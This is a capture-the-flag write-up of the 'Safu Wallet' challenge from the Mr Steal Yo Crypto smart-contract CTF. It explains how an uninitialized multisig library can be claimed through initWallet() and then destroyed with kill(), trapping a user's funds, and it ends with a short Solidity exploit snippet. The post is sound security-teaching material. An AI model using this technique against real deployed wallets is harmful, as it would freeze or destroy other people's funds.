---
title: "Mr Steal Yo Crypto — Safu Wallet"
date: 2023-07-22
draft: false
description: "CTF - 5"
tags: ["CTF"]
series: ["CTF"]
series_order: 5
topics: ["CTF"]
showAuthor: false
showAuthorsBadges : false
---
This is the #5 challenge of [Mr Steal Yo Crypto](https://mrstealyocrypto.xyz/index.html). I will try to explain how to find the vulnerability.

> A set of challenges to learn offensive security of smart contracts. Featuring interesting challenges loosely (or directly) inspired by real-world exploits.

> Created by [@0xToshii](https://twitter.com/0xToshii)

I used the foundry version for this CTF: [mr-steal-yo-crypto-ctf-foundry](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement)

![Mr Steal Yo Crypto](https://cdn-images-1.medium.com/max/800/1*67w9ffBxLP4AMvoxHowZ2w.jpeg)

## Safu Wallet

After Safu Labs’ SafuVault product was exploited, they decided to start fresh and venture into the secure web3 tooling space — what could go wrong.

They’ve launched their first product: a multi-sig wallet, and have already onboarded a user.

Your task is to grief that user by trapping their funds inside the wallet.

- [See the contracts](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/tree/implement/src/safu-wallet)
- [Complete the challenge](https://github.com/0xToshii/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/5-safu-wallet.sol)

### Review of the contracts

#### ISafuWalletLibrary.sol

I have nothing to say about an interface.

#### SafuWallet.sol

The first thing that warned me is that `_safuWalletLibrary` is a constant address. Normally, a library is directly imported into the contract.

#### SafuWalletLibrary.sol

Now we know `_safuWalletLibrary` is another deployed contract. Maybe we will see something interesting inside this contract:

- `kill()`: we can destruct the contract if we can bypass the modifier `onlymanyowners()`.
- `onlymanyowners()`: The modifier calls `confirmAndCheck()`, so we will look into it.
- `confirmAndCheck()`: There are a bunch of conditions, if we are able to set `m_ownerIndex[uint(msg.sender)] = 1` then we can destruct the library.
- We can set `m_ownerIndex[uint(msg.sender)] = 1` inside `initMultiowned()`. This function is called inside `initWallet()`, but this one is only callable one time due to the modifier `only_uninitialized`.

I already know how to bypass the modifier `only_uninitialized` so let’s go to the next part.

### Exploit the vulnerability

This challenge was very easy. The library is a deployed contract, so if we are able to destruct the contract, we pass the challenge.
And wow! What a surprise, when we go to the test file it seems that the function `initWallet()` is never called. It means that I’m able to call `initWallet` (we pass the modifier `only_uninitialized`). After that call, we have now `m_ownerIndex[uint(msg.sender)] = 1`. Now we can destruct the contract.

```kotlin
//We are in a situation where safuWalletLibrary is deployed but not initialized and so all the variable are at 0
// After the deployment of safuWallet, we might think that the variable inside safuWalletLibrary are updated
// However, during a delegate call, the caller storage is updated not the callee
// (In this challenge, we have a storage collision but not useful)
// And so the variables inside safuWalletLibrary are still at 0
// We are able to kill safuWalletLibrary -&gt;safuWallet is unable to do a delegate call for this address

//Call initWallet() in order to get the ownership
addresses = new address[](1);
addresses[0] = attacker;
data = abi.encodeWithSignature("initWallet(address[],uint256,uint256)", addresses, 1, type(uint).max);
address(safuWalletLibrary).call(data);

//call kill() in order to destruct the contract
data = abi.encodeWithSignature("kill(address)", address(attacker));
address(safuWalletLibrary).call(data);
```

You can check my test file [here](https://github.com/gp-ngmi/mr-steal-yo-crypto-ctf-foundry/blob/implement/test/5-safu-wallet.sol).

### Acknowledgement

Thank you [https://stermi.xyz/](https://stermi.xyz/) for inspiring me to write articles on CTF ^^.
